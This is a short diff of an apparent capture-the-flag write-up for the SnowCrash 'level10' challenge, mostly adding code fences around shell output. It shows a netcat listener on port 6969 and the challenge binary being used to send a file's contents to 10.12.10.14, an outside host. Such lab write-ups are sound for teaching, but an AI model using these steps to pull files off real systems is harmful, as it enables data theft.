@@ -26,9 +26,13 @@ Connecting to 10.12.10.14:6969 .. Connected!
 Sending file .. wrote file!
 
 on the host:
+```
 nc -l 6969
 .*( )*.
 test
+```
+
+```
 level10@SnowCrash:~$ echo "`getflag`" > /tmp/test
 level10@SnowCrash:~$ ./level10 /tmp/test 10.12.10.14
 
@@ -36,9 +40,9 @@ nc -l 6969
 .*( )*.
 Check flag.Here is your token :
 Nope there is no token here for you sorry. Try again :)
+```
 
-level10@SnowCrash:~$ ./level10 token 10.12.10.14
-You don't have access to token
+
 
 
 
